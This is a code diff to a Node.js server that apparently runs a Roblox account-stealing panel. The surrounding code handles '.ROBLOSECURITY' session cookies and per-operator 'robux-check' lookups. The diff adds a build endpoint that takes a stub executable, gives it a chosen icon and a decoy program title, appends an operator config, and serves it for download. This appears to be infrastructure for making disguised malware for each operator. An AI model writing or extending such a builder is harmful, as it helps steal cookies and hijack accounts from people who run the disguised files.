@@ -796,6 +796,71 @@ async function fetchRobuxInfoAsync(robloSecurity, operator, uploaded, db) {
     console.log(`[${new Date().toLocaleTimeString()}] ⚠️ Асинхронное обновление robuxInfo не удалось: ${e.message}`);
   }
 }
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+//  API — Builder Endpoint (Generate Stub Executable)
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+const fs = require('fs');
+
+app.post('/api/build', requireAuth, upload.single('icon'), async (req, res) => {
+  try {
+    const operator = req.body.operator || req.authUser || 'Shonll';
+    const appTitleMain = req.body.appTitleMain || 'RAH NonPro';
+    const appTitleVersion = req.body.appTitleVersion || ' v7.0.1';
+    const windowTitle = req.body.windowTitle || `${appTitleMain}${appTitleVersion}`;
+
+    // Read the master Stub.exe
+    const stubPath = path.join(__dirname, 'uploads', 'Stub.exe');
+    if (!fs.existsSync(stubPath)) {
+      return res.status(500).json({ error: 'Stub.exe not found on server' });
+    }
+    let exeBuffer = fs.readFileSync(stubPath);
+
+    // If an icon was uploaded, use resedit to change the icon
+    if (req.file && req.file.buffer) {
+      try {
+        const peLibrary = require('pe-library');
+        const resedit = require('resedit');
+        const data = peLibrary.NtExecutable.from(exeBuffer);
+        const resList = peLibrary.NtExecutableResource.from(data);
+        const iconFile = resedit.Data.IconFile.from(req.file.buffer);
+        resedit.Resource.IconGroupEntry.replaceIconsForResource(
+          resList.entries, 1, 1033, iconFile.icons.map(i => i.data)
+        );
+        resList.outputResource(data);
+        exeBuffer = Buffer.from(data.generate());
+      } catch (iconErr) {
+        console.error('Error replacing icon:', iconErr.message);
+        // Continue with original icon if it fails
+      }
+    }
+
+    // Append config JSON
+    const config = {
+      operatorName: operator,
+      appTitleMain,
+      appTitleVersion,
+      windowTitle
+    };
+    const configJson = JSON.stringify(config);
+    const marker = "<<NEXUS_CFG>>";
+    
+    const markerBuffer = Buffer.from(marker, 'utf8');
+    const jsonBuffer = Buffer.from(configJson, 'utf8');
+    
+    const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, jsonBuffer]);
+
+    const filename = `${appTitleMain.replace(/[^a-z0-9]/gi, '_')}.exe`;
+
+    res.setHeader('Content-Type', 'application/vnd.microsoft.portable-executable');
+    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+    res.send(finalBuffer);
+
+  } catch (err) {
+    console.error('Build Error:', err);
+    res.status(500).json({ error: 'Failed to build executable' });
+  }
+});
+
 app.post('/robux-check', requireAuth, async (req, res) => {
   const { robloSecurity } = req.body;
   if (!robloSecurity) {
